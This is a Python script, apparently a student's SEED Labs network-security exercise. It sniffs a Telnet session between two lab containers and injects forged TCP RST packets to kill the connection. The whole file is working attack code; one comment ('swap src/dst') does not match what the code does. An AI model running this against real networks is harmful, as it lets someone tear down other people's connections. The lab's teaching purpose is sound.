#!/usr/bin/env python3
"""
Task 2 — TCP RST Attack on Telnet Connections
Author: Naga Jyothi Mahankali
Course: Network Security — SEED Labs

How it works:
  Sniffs live TCP packets on the network, then for each packet belonging
  to the target Telnet session forges a TCP RST segment with the correct
  sequence number. When the victim or user1 receives the RST, the OS
  tears down the TCP connection immediately — killing the Telnet session.

  The attacker must be on the same LAN segment as the victim (or be able
  to sniff the traffic) so the sequence numbers can be observed.

Usage (run as root on attacker container):
  python3 rst_attack.py
"""

from scapy.all import *

# ── Configuration ──────────────────────────────────────────────────────────────
VICTIM_IP = "10.9.0.5"    # Telnet server (victim)
USER1_IP  = "10.9.0.6"    # Telnet client (user1)
TELNET_PORT = 23
INTERFACE   = "br-"        # Change to the actual bridge interface name (e.g. br-a1b2c3d4e5f6)
                           # Run `ip addr` on the host to find it
# ───────────────────────────────────────────────────────────────────────────────

def send_rst(pkt):
    """
    Called for every sniffed packet.  If it belongs to the monitored
    Telnet session, craft and send a forged RST.
    """
    if not (pkt.haslayer(TCP) and pkt.haslayer(IP)):
        return

    ip  = pkt[IP]
    tcp = pkt[TCP]

    # Only act on packets in the Telnet session between victim and user1
    if not ({ip.src, ip.dst} == {VICTIM_IP, USER1_IP}):
        return
    if not (tcp.sport == TELNET_PORT or tcp.dport == TELNET_PORT):
        return

    print(f"[*] Sniffed: {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport}  "
          f"seq={tcp.seq}  ack={tcp.ack}  flags={tcp.flags}")

    # Forge RST: swap src/dst, set RST flag, use next expected seq number
    rst_ip  = IP(src=ip.src, dst=ip.dst)
    rst_tcp = TCP(sport=tcp.sport, dport=tcp.dport,
                  flags="R",
                  seq=tcp.seq + len(tcp.payload))

    rst_pkt = rst_ip / rst_tcp
    send(rst_pkt, verbose=0)
    print(f"[!] RST sent: {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport}  "
          f"seq={rst_tcp.seq}")


# Sniff only TCP traffic between victim and user1
bpf_filter = (f"tcp and "
              f"((src host {VICTIM_IP} and dst host {USER1_IP}) or "
              f" (src host {USER1_IP} and dst host {VICTIM_IP}))")

print(f"[*] Sniffing for Telnet session between {VICTIM_IP} and {USER1_IP}")
print(f"[*] Filter: {bpf_filter}")
print("[*] Press Ctrl+C to stop\n")

sniff(iface=INTERFACE, filter=bpf_filter, prn=send_rst)
